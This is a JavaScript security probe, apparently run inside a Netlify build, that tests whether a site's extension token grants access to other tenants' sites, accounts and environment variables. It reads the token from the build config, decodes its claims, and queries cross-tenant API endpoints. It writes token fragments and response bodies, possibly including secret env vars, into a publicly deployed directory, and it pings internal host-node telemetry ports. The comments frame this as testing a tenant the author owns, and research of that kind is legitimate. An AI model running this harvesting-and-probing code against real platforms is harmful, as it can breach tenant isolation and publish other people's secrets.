// agentdeep-8 — extension_token scope-binding test (Lane A sub-lane d).
// Q: is the per-site extension JWT (site:read/write, env:*, blob:*) honored by the
// CORE API for OTHER sites/accounts (nl3) — i.e., is the accepting endpoint checking
// the site binding? Cross-tenant env read/write would be HIGH (env vars = secrets).
// Also: 2 cheap sub-lane (c) cells (OTLP 4318 POST, statsd 8125 UDP).
// NO socket deploySite calls — let netlify-build do its normal deploy at the end.
import fs from 'node:fs';
import net from 'node:net';
import dgram from 'node:dgram';

const R = { probe: 'agentdeep-8', t: new Date().toISOString() };
const cap = (v, n = 1500) => (typeof v === 'string' && v.length > n ? v.slice(0, n) + '..TRUNC' : v);
const flush = () => { try { fs.writeFileSync('pubdir/agentdeep8.json', JSON.stringify(R, null, 1)); } catch {} };
fs.mkdirSync('pubdir', { recursive: true });

// 1) load config + extension token
try {
  const cfg = JSON.parse(fs.readFileSync('/tmp/netlify_config.json', 'utf8'));
  R.cfgKeys = Object.keys(cfg);
  const integ = cfg.integrations || [];
  R.integrations = integ.map((i) => ({ slug: i.slug, name: i.name, has_build: i.has_build, extTokHead: (i.extension_token || '').slice(0, 25), extTokLen: (i.extension_token || '').length }));
  const tok = integ[0] && integ[0].extension_token;
  R.extTokClaims = (() => { try {
    const [, p] = tok.split('.'); const b = Buffer.from(p.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString();
    return JSON.parse(b);
  } catch (e) { return 'ERR ' + String(e).slice(0, 60); } })();
  flush();

  const H = { Authorization: 'Bearer ' + tok };
  const call = async (tag, url, opts = {}) => {
    try {
      const r = await fetch(url, { ...opts, headers: { ...H, ...(opts.headers || {}) } });
      const body = await r.text();
      R[tag] = { s: r.status, head: cap(body, 800) };
    } catch (e) { R[tag] = { err: String(e).slice(0, 120) }; }
    flush();
  };

  // controls: OUR site (nl2) — is the token honored at all, and for what?
  await call('ownSite', 'https://api.netlify.com/api/v1/sites/3e3ae2e4-3021-46a1-8400-4898f2dd07cb');
  await call('ownSiteEnv', 'https://api.netlify.com/api/v1/accounts/6a57be1beaa1dc73c8b2cd88/env');
  await call('ownSiteEnvV2', 'https://api.netlify.com/api/v1/sites/3e3ae2e4-3021-46a1-8400-4898f2dd07cb/env');

  // cross-tenant cells: nl3 site + nl3 orgs (throwaway tenant WE own — clean PoC)
  await call('xtSiteNl3', 'https://api.netlify.com/api/v1/sites/26743cb0-18b1-4de7-a09d-87c093d5e16a');
  await call('xtEnvNl3Site', 'https://api.netlify.com/api/v1/sites/26743cb0-18b1-4de7-a09d-87c093d5e16a/env');
  await call('xtEnvNl3CoreOrg', 'https://api.netlify.com/api/v1/accounts/6ad77c2ddb8a7fbc75196c4b/env');
  await call('xtEnvNl3CreateOrg', 'https://api.netlify.com/api/v1/accounts/6ad77c2e5ee1abec2f63e74a/env');
  await call('xtFormsNl3', 'https://api.netlify.com/api/v1/sites/26743cb0-18b1-4de7-a09d-87c093d5e16a/forms');

  // whoami — what identity does the API think this token has?
  await call('whoami', 'https://api.netlify.com/api/v1/user');
} catch (e) { R.cfgErr = String(e).slice(0, 150); flush(); }

// 2) sub-lane (c) cheap cells
try {
  const host = (fs.readFileSync('/proc/net/route', 'utf8'), process.env.HOST_NODE_IP) || null;
  R.hostNodeIpEnv = process.env.HOST_NODE_IP || null;
  const hip = R.hostNodeIpEnv;
  if (hip) {
    // statsd 8125 UDP — single line, bounded
    const sock = dgram.createSocket('udp4');
    sock.send('netlify.probe.agentdeep8:1|c', 8125, hip, (err) => { R.statsd8125 = err ? 'ERR ' + String(err).slice(0, 60) : 'sent'; sock.close(); flush(); });
    // OTLP 4318 — one tiny POST
    const r = await fetch(`http://${hip}:4318/v1/traces`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ resourceSpans: [{ resource: { attributes: [{ key: 'probe', value: { stringValue: 'agentdeep8' } }] }, scopeSpans: [{ spans: [{ traceId: '0123456789abcdef0123456789abcdef', spanId: '0123456789abcdef', name: 'agentdeep8', kind: 1, startTimeUnixNano: String(Date.now()) + '000000', endTimeUnixNano: String(Date.now()) + '000000', attributes: [] }] }] }] }) }).catch((e) => ({ status: 'ERR', err: String(e).slice(0, 80) }));
    R.otlp4318 = { s: r.status, body: cap(await r.text().catch(() => ''), 200) };
    flush();
  }
} catch (e) { R.subcErr = String(e).slice(0, 120); flush(); }

R.done = new Date().toISOString();
flush();
console.log('agentdeep-8 done');
